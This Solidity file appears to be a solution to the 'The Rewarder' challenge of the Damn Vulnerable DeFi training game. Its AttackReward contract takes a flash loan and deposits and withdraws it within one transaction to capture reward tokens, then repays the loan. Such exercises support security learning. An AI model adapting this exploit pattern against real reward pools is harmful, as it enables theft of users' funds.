// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import {FlashLoanerPool} from "../the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackReward {
    FlashLoanerPool immutable pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool public immutable rewardpool;
    address immutable owner;

    constructor(address _pool, address liquidityTokenAddress,address _rewardpool){
        pool = FlashLoanerPool(_pool);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardpool = TheRewarderPool(_rewardpool);
        owner = msg.sender;
    }

    function Attack() public {
        pool.flashLoan(liquidityToken.balanceOf(address(pool)));
        rewardpool.rewardToken().transfer(owner , rewardpool.rewardToken().balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardpool), amount);
        rewardpool.deposit(amount);
        rewardpool.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }
}